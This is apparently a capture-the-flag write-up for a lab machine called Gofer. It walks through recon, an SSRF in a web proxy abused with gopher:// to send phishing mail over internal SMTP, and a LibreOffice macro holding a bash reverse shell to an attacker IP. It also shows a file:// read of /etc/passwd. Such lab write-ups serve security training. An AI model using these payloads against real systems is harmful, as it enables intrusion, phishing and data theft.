# Gofer

## Reconnaissance

### Nmap

```c
$ sudo nmap -A -T4 -sC -sV 10.129.132.88
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-29 19:02 UTC
Nmap scan report for 10.129.132.88
Host is up (0.13s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE    SERVICE     VERSION
22/tcp  open     ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 aa:25:82:6e:b8:04:b6:a9:a9:5e:1a:91:f0:94:51:dd (RSA)
|   256 18:21:ba:a7:dc:e4:4f:60:d7:81:03:9a:5d:c2:e5:96 (ECDSA)
|_  256 a4:2d:0d:45:13:2a:9e:7f:86:7a:f6:f7:78:bc:42:d9 (ED25519)
25/tcp  filtered smtp
80/tcp  open     http        Apache httpd 2.4.56
|_http-title: Did not follow redirect to http://gofer.htb/
|_http-server-header: Apache/2.4.56 (Debian)
139/tcp open     netbios-ssn Samba smbd 4.6.2
445/tcp open     netbios-ssn Samba smbd 4.6.2
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=7/29%OT=22%CT=1%CU=41310%PV=Y%DS=2%DC=T%G=Y%TM=64C5628
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=103%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11
OS:NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE8
OS:8%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53
OS:ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(
OS:R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F
OS:=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y
OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
OS:=40%CD=S)

Network Distance: 2 hops
Service Info: Host: gofer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: GOFER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-07-29T19:03:30
|_  start_date: N/A

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   72.21 ms 10.10.16.1
2   36.34 ms 10.129.132.88

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.30 seconds
```

```c
$ sudo nmap -A -T4 -sC -sV -p- 10.129.132.88
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-29 19:03 UTC
Nmap scan report for gofer.htb (10.129.132.88)
Host is up (0.042s latency).
Not shown: 65530 closed tcp ports (reset)
PORT    STATE    SERVICE     VERSION
22/tcp  open     ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 aa:25:82:6e:b8:04:b6:a9:a9:5e:1a:91:f0:94:51:dd (RSA)
|   256 18:21:ba:a7:dc:e4:4f:60:d7:81:03:9a:5d:c2:e5:96 (ECDSA)
|_  256 a4:2d:0d:45:13:2a:9e:7f:86:7a:f6:f7:78:bc:42:d9 (ED25519)
25/tcp  filtered smtp
80/tcp  open     http        Apache httpd 2.4.56
|_http-title: Gofer
|_http-server-header: Apache/2.4.56 (Debian)
139/tcp open     netbios-ssn Samba smbd 4.6.2
445/tcp open     netbios-ssn Samba smbd 4.6.2
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=7/29%OT=22%CT=1%CU=39929%PV=Y%DS=2%DC=T%G=Y%TM=64C562D
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=103%TI=Z%TS=A)SEQ(SP=105%GC
OS:D=1%ISR=106%TI=Z%TS=A)SEQ(SP=105%GCD=1%ISR=106%TI=Z%CI=Z%TS=A)OPS(O1=M53
OS:AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6
OS:=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF
OS:=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%
OS:Q=)T2(R=N)T3(R=N)T4(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=40
OS:%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%
OS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-07-29T19:04:44
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: GOFER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   40.52 ms 10.10.16.1
2   40.58 ms gofer.htb (10.129.132.88)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.93 seconds
```

```c
$ sudo nmap -sV -sU 10.129.132.88
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-29 19:07 UTC
Nmap scan report for gofer.htb (10.129.132.88)
Host is up (0.038s latency).
Not shown: 997 closed udp ports (port-unreach)
PORT    STATE         SERVICE     VERSION
68/udp  open|filtered dhcpc
137/udp open          netbios-ns  Samba nmbd netbios-ns (workgroup: WORKGROUP)
138/udp open|filtered netbios-dgm
Service Info: Host: GOFER

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1119.79 seconds
```

### Enumeration of Port 80/TCP

> http://10.129.132.88

We got redirected to `gofer.htb` and added it to the `/etc/hosts` file.

```c
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.132.88   gofer.htb
```

> http://gofer.htb

```c
$ whatweb http://gofer.htb
http://gofer.htb [200 OK] Apache[2.4.56], Bootstrap, Country[RESERVED][ZZ], Email[info@gofer.htb], Frame, HTML5, HTTPServer[Debian Linux][Apache/2.4.56 (Debian)], IP[10.129.132.88], Lightbox, Script, Title[Gofer]
```

### Subdomain Enumeration with ffuf

```c
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.gofer.htb" -u http://gofer.htb --fw 20

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://gofer.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Header           : Host: FUZZ.gofer.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 20
________________________________________________

[Status: 401, Size: 462, Words: 42, Lines: 15, Duration: 43ms]
    * FUZZ: proxy

:: Progress: [207643/207643] :: Job [1/1] :: 843 req/sec :: Duration: [0:03:58] :: Errors: 0 ::
```

We added `proxy.gofer.htb` as well.

```c
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.132.88   gofer.htb
10.129.132.88   proxy.gofer.htb
```

### Directory Busting with dirsearch

```c
$ dirsearch -u http://gofer.htb

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/username/.dirsearch/reports/gofer.htb/_23-07-29_19-03-41.txt

Error Log: /home/username/.dirsearch/logs/errors-23-07-29_19-03-41.log

Target: http://gofer.htb/

[19:03:42] Starting: 
[19:03:43] 403 -  274B  - /.ht_wsr.txt                                     
[19:03:44] 403 -  274B  - /.htaccess.orig                                  
[19:03:44] 403 -  274B  - /.htaccess.save
[19:03:44] 403 -  274B  - /.htaccess.sample
[19:03:44] 403 -  274B  - /.htaccess_orig
[19:03:44] 403 -  274B  - /.htaccess_extra
[19:03:44] 403 -  274B  - /.htaccess_sc
[19:03:44] 403 -  274B  - /.htaccessBAK                                    
[19:03:44] 403 -  274B  - /.htm
[19:03:44] 403 -  274B  - /.htaccessOLD                                    
[19:03:44] 403 -  274B  - /.htaccessOLD2
[19:03:44] 403 -  274B  - /.htpasswd_test
[19:03:44] 403 -  274B  - /.httr-oauth
[19:03:44] 403 -  274B  - /.html
[19:03:44] 403 -  274B  - /.htaccess.bak1                                  
[19:03:44] 403 -  274B  - /.htpasswds                                      
[19:03:44] 403 -  274B  - /.php                                            
[19:03:58] 301 -  307B  - /assets  ->  http://gofer.htb/assets/             
[19:03:58] 200 -    2KB - /assets/                                          
[19:04:09] 200 -   29KB - /index.html                                       
[19:04:23] 403 -  274B  - /server-status/                                   
[19:04:23] 403 -  274B  - /server-status
                                                                             
Task Completed
```

```c
$ dirsearch -u http://proxy.gofer.htb

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )
                                                                                                                                                                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/username/.dirsearch/reports/proxy.gofer.htb/_23-07-29_19-06-19.txt

Error Log: /home/username/.dirsearch/logs/errors-23-07-29_19-06-19.log

Target: http://proxy.gofer.htb/

[19:06:19] Starting: 
[19:06:22] 403 -  280B  - /.ht_wsr.txt                                     
[19:06:22] 403 -  280B  - /.htaccess.bak1                                  
[19:06:22] 403 -  280B  - /.htaccess.orig
[19:06:22] 403 -  280B  - /.htaccess.save                                  
[19:06:22] 403 -  280B  - /.htaccess.sample
[19:06:22] 403 -  280B  - /.htaccess_extra
[19:06:22] 403 -  280B  - /.htaccess_sc
[19:06:22] 403 -  280B  - /.htaccess_orig
[19:06:22] 403 -  280B  - /.htaccessOLD
[19:06:22] 403 -  280B  - /.htaccessBAK
[19:06:22] 403 -  280B  - /.htaccessOLD2
[19:06:22] 403 -  280B  - /.html                                           
[19:06:22] 403 -  280B  - /.htm
[19:06:22] 403 -  280B  - /.htpasswds
[19:06:22] 403 -  280B  - /.htpasswd_test
[19:06:22] 403 -  280B  - /.httr-oauth
[19:06:23] 403 -  280B  - /.php                                            
[19:07:04] 403 -  280B  - /server-status                                    
[19:07:04] 403 -  280B  - /server-status/                                   
                                                                             
Task Completed
```

### Enumeration of Port 445/TCP

```c
$ smbclient -L 10.129.132.88
Password for [WORKGROUP\username]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shares          Disk      
        IPC$            IPC       IPC Service (Samba 4.13.13-Debian)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

```c
$ smbclient //10.129.132.88/shares/  
Password for [WORKGROUP\username]:
Try "help" to get a list of possible commands.
smb: \>
```

```c
$ smbclient //10.129.132.88/shares/  
Password for [WORKGROUP\username]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Oct 28 19:32:08 2022
  ..                                  D        0  Fri Apr 28 11:59:34 2023
  .backup                            DH        0  Thu Apr 27 12:49:32 2023

                5061888 blocks of size 1024. 2154096 blocks available
```

```c
smb: \.backup\> dir
  .                                   D        0  Thu Apr 27 12:49:32 2023
  ..                                  D        0  Fri Oct 28 19:32:08 2022
  mail                                N     1101  Thu Apr 27 12:49:32 2023

                5061888 blocks of size 1024. 2154080 blocks available
```

```c
smb: \.backup\> get mail
getting file \.backup\mail of size 1101 as mail (3.9 KiloBytes/sec) (average 3.9 KiloBytes/sec)
```

```c
$ cat mail 
From jdavis@gofer.htb  Fri Oct 28 20:29:30 2022
Return-Path: <jdavis@gofer.htb>
X-Original-To: tbuckley@gofer.htb
Delivered-To: tbuckley@gofer.htb
Received: from gofer.htb (localhost [127.0.0.1])
        by gofer.htb (Postfix) with SMTP id C8F7461827
        for <tbuckley@gofer.htb>; Fri, 28 Oct 2022 20:28:43 +0100 (BST)
Subject:Important to read!
Message-Id: <20221028192857.C8F7461827@gofer.htb>
Date: Fri, 28 Oct 2022 20:28:43 +0100 (BST)
From: jdavis@gofer.htb

Hello guys,

Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That's why from now on, I've decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice.

PS: Last thing for Tom; I know you're working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seems to me that it should be possible to do so via <Limit>
```

| Username |
| --- |
| jdavis |
| tbuckley |

From the website we created the other usernames.

| Username |
| --- |
| jhudson |
| ablake |

### Enumeration SMTP

> http://gofer.htb/

On the bottom of the page we investigated the field to subscribe.

Request:

```c
POST / HTTP/1.1
Host: gofer.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://gofer.htb
DNT: 1
Connection: close
Referer: http://gofer.htb/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

email=foobar%40foobar.local
```

### LIMIT Bypass via POST Request

We tested for parameter to bypass.

```c
$ dirsearch  -u http://proxy.gofer.htb -m POST

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: POST | Threads: 30 | Wordlist size: 10927

Output File: /home/username/.dirsearch/reports/proxy.gofer.htb/_23-07-29_19-51-04.txt

Error Log: /home/username/.dirsearch/logs/errors-23-07-29_19-51-04.log

Target: http://proxy.gofer.htb/

[19:51:04] Starting: 
[19:51:08] 403 -  280B  - /.ht_wsr.txt                                     
[19:51:08] 403 -  280B  - /.htaccess.bak1
[19:51:08] 403 -  280B  - /.htaccess.orig
[19:51:08] 403 -  280B  - /.htaccess.sample
[19:51:08] 403 -  280B  - /.htaccess.save
[19:51:08] 403 -  280B  - /.htaccess_extra
[19:51:08] 403 -  280B  - /.htaccess_sc
[19:51:08] 403 -  280B  - /.htaccess_orig
[19:51:08] 403 -  280B  - /.htaccessOLD2
[19:51:08] 403 -  280B  - /.htaccessBAK
[19:51:08] 403 -  280B  - /.htaccessOLD
[19:51:08] 403 -  280B  - /.htm                                            
[19:51:08] 403 -  280B  - /.html
[19:51:08] 403 -  280B  - /.httr-oauth
[19:51:08] 403 -  280B  - /.htpasswd_test
[19:51:08] 403 -  280B  - /.htpasswds                                      
[19:51:09] 403 -  280B  - /.php                                            
[19:51:33] 200 -   81B  - /index.php                                        
[19:51:33] 200 -   81B  - /index.php/login/                                 
[19:51:45] 403 -  280B  - /server-status                                    
[19:51:45] 403 -  280B  - /server-status/
                                                                             
Task Completed
```

Request:

```c
GET / HTTP/1.1
Host: proxy.gofer.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

Modified Request:

```c
POST /index.php HTTP/1.1
Host: proxy.gofer.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

Response:

```c
HTTP/1.1 200 OK
Date: Sat, 29 Jul 2023 19:57:47 GMT
Server: Apache/2.4.56 (Debian)
Vary: Accept-Encoding
Content-Length: 81
Connection: close
Content-Type: text/html; charset=UTF-8

<!-- Welcome to Gofer proxy -->
<html><body>Missing URL parameter !</body></html>
```

Modified Request:

```c
POST /index.php?url=http://10.10.16.14/foobar HTTP/1.1
Host: proxy.gofer.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

Response:

```c
HTTP/1.1 200 OK
Date: Sat, 29 Jul 2023 19:58:19 GMT
Server: Apache/2.4.56 (Debian)
Vary: Accept-Encoding
Content-Length: 368
Connection: close
Content-Type: text/html; charset=UTF-8

<!-- Welcome to Gofer proxy -->
<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: 404 - Nothing matches the given URI.</p>
    </body>
</html>
1
```

```c
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.132.88 - - [29/Jul/2023 19:58:20] code 404, message File not found
10.129.132.88 - - [29/Jul/2023 19:58:20] "GET /foobar HTTP/1.1" 404 -
```

Modified Request:

```c
POST /index.php?url=gopher://7f000001:25/_MAIL%20FROM:tbuckley%40gofer.htb%0ARCPT%20To:jhudson%40gofer.htb%0ADATA%0AFrom:tbuckley%40gofer.htb%0ASubject:message%0AMessage:http://10.10.16.14/foobar%0A HTTP/1.1
Host: proxy.gofer.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

```c
HTTP/1.1 200 OK
Date: Sat, 29 Jul 2023 19:59:58 GMT
Server: Apache/2.4.56 (Debian)
Content-Length: 32
Connection: close
Content-Type: text/html; charset=UTF-8

<!-- Welcome to Gofer proxy -->

```

### Creating Payload with gopher

> https://github.com/tarunkant/Gopherus

```c
$ python2 gopherus.py --exploit smtp                                       

                                                                                                                                                                                                                                            
  ________              .__                                                                                                                                                                                                                 
 /  _____/  ____ ______ |  |__   ___________ __ __  ______                                                                                                                                                                                  
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/                                                                                                                                                                                  
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \                                                                                                                                                                                   
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >                                                                                                                                                                                  
        \/       |__|        \/     \/                 \/                                                                                                                                                                                   
                                                                                                                                                                                                                                            
                author: $_SpyD3r_$                                                                                                                                                                                                          
                                                                                                                                                                                                                                            

Give Details to send mail: 

Mail from :  jdavis@gofer.htb                                                               
Mail To :  jhudson@gofer.htb
Subject :  click on the link
Message :  http://10.10.16.14:25/foobar.odt

Your gopher link is ready to send Mail:                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
gopher://127.0.0.1:25/_MAIL%20FROM:jdavis%40gofer.htb%0ARCPT%20To:jhudson%40gofer.htb%0ADATA%0AFrom:jdavis%40gofer.htb%0ASubject:click%20on%20the%20link%0AMessage:http://10.10.16.14:25/foobar.odt%0A.

-----------Made-by-SpyD3r-----------
```

> https://highon.coffee/blog/ssrf-cheat-sheet/

| Bypass |
| --- |
| 2130706433 |

Payload:

```c
POST /index.php?url=gopher://2130706433:25/_MAIL%20FROM:jdavis%40gofer.htb%0ARCPT%20To:jhudson%40gofer.htb%0ADATA%0AFrom:jdavis%40gofer.htb%0ASubject:click%20on%20the%20link%0AMessage:http://10.10.16.14:25/foobar.odt%0A. HTTP/1.1
```

URL encoded all chars:

```c
%67%6f%70%68%65%72%3a%2f%2f%32%31%33%30%37%30%36%34%33%33%3a%32%35%2f%5f%4d%41%49%4c%25%32%30%46%52%4f%4d%3a%6a%64%61%76%69%73%25%34%30%67%6f%66%65%72%2e%68%74%62%25%30%41%52%43%50%54%25%32%30%54%6f%3a%6a%68%75%64%73%6f%6e%25%34%30%67%6f%66%65%72%2e%68%74%62%25%30%41%44%41%54%41%25%30%41%46%72%6f%6d%3a%6a%64%61%76%69%73%25%34%30%67%6f%66%65%72%2e%68%74%62%25%30%41%53%75%62%6a%65%63%74%3a%63%6c%69%63%6b%25%32%30%6f%6e%25%32%30%74%68%65%25%32%30%6c%69%6e%6b%25%30%41%4d%65%73%73%61%67%65%3a%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%36%2e%31%34%3a%32%35%2f%66%6f%6f%62%61%72%2e%6f%64%74%25%30%41%2e
```

Modified Request:

```c
POST /index.php?url=%67%6f%70%68%65%72%3a%2f%2f%32%31%33%30%37%30%36%34%33%33%3a%32%35%2f%5f%4d%41%49%4c%25%32%30%46%52%4f%4d%3a%6a%64%61%76%69%73%25%34%30%67%6f%66%65%72%2e%68%74%62%25%30%41%52%43%50%54%25%32%30%54%6f%3a%6a%68%75%64%73%6f%6e%25%34%30%67%6f%66%65%72%2e%68%74%62%25%30%41%44%41%54%41%25%30%41%46%72%6f%6d%3a%6a%64%61%76%69%73%25%34%30%67%6f%66%65%72%2e%68%74%62%25%30%41%53%75%62%6a%65%63%74%3a%63%6c%69%63%6b%25%32%30%6f%6e%25%32%30%74%68%65%25%32%30%6c%69%6e%6b%25%30%41%4d%65%73%73%61%67%65%3a%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%36%2e%31%34%3a%32%35%2f%66%6f%6f%62%61%72%2e%6f%64%74%25%30%41%2e HTTP/1.1
Host: proxy.gofer.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

```c
$ nc -klnvp 25
listening on [any] 25 ...
connect to [10.10.16.14] from (UNKNOWN) [10.129.132.88] 51004
GET /foobar.odt HTTP/1.1
User-Agent: Wget/1.21
Accept: */*
Accept-Encoding: identity
Host: 10.10.16.14:25
Connection: Keep-Alive
```

## Create malicious LibreOffice Macro

> https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html

Macro:

```c
Sub Main

    Shell("bash -c 'bash -i >& /dev/tcp/10.10.16.14/9001 0>&1'")
	
End Sub
```

- Tools > Macros > Edit Macros...
- Tools > Macros > Organize Macros > Basic...
- clickme.odt > Standard > Main > Assign
- Events > Open Document

Payload:

```c
POST /index.php?url=gopher://2130706433:25/_MAIL%20FROM:jdavis%40gofer.htb%0ARCPT%20To:jhudson%40gofer.htb%0ADATA%0AFrom:jdavis%40gofer.htb%0ASubject:click%20on%20the%20link%0AMessage:http://10.10.16.14/clickme.odt%0A. HTTP/1.1
```

URL encoded all chars:

```c
%67%6f%70%68%65%72%3a%2f%2f%32%31%33%30%37%30%36%34%33%33%3a%32%35%2f%5f%4d%41%49%4c%25%32%30%46%52%4f%4d%3a%6a%64%61%76%69%73%25%34%30%67%6f%66%65%72%2e%68%74%62%25%30%41%52%43%50%54%25%32%30%54%6f%3a%6a%68%75%64%73%6f%6e%25%34%30%67%6f%66%65%72%2e%68%74%62%25%30%41%44%41%54%41%25%30%41%46%72%6f%6d%3a%6a%64%61%76%69%73%25%34%30%67%6f%66%65%72%2e%68%74%62%25%30%41%53%75%62%6a%65%63%74%3a%63%6c%69%63%6b%25%32%30%6f%6e%25%32%30%74%68%65%25%32%30%6c%69%6e%6b%25%30%41%4d%65%73%73%61%67%65%3a%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%36%2e%31%34%2f%63%6c%69%63%6b%6d%65%2e%6f%64%74%25%30%41%2e
```

Modified Request:

```c
POST /index.php?url=%67%6f%70%68%65%72%3a%2f%2f%32%31%33%30%37%30%36%34%33%33%3a%32%35%2f%5f%4d%41%49%4c%25%32%30%46%52%4f%4d%3a%6a%64%61%76%69%73%25%34%30%67%6f%66%65%72%2e%68%74%62%25%30%41%52%43%50%54%25%32%30%54%6f%3a%6a%68%75%64%73%6f%6e%25%34%30%67%6f%66%65%72%2e%68%74%62%25%30%41%44%41%54%41%25%30%41%46%72%6f%6d%3a%6a%64%61%76%69%73%25%34%30%67%6f%66%65%72%2e%68%74%62%25%30%41%53%75%62%6a%65%63%74%3a%63%6c%69%63%6b%25%32%30%6f%6e%25%32%30%74%68%65%25%32%30%6c%69%6e%6b%25%30%41%4d%65%73%73%61%67%65%3a%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%36%2e%31%34%2f%63%6c%69%63%6b%6d%65%2e%6f%64%74%25%30%41%2e HTTP/1.1
Host: proxy.gofer.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

```c
$ nc -lnvp 9001     
listening on [any] 9001 ...
connect to [10.10.16.14] from (UNKNOWN) [10.129.132.88] 50962
bash: cannot set terminal process group (1809): Inappropriate ioctl for device
bash: no job control in this shell
bash: /home/jhudson/.bashrc: Permission denied
jhudson@gofer:/usr/bin$
```

## Local File Inclusion (probably unintended)

Modified Request:

```c
POST /index.php?url=file:/etc/passwd HTTP/1.1
Host: proxy.gofer.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1


```

Response:

```c
HTTP/1.1 200 OK
Date: Sat, 29 Jul 2023 21:09:46 GMT
Server: Apache/2.4.56 (Debian)
Vary: Accept-Encoding
Content-Length: 1722
Connection: close
Content-Type: text/html; charset=UTF-8

<!-- Welcome to Gofer proxy -->
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
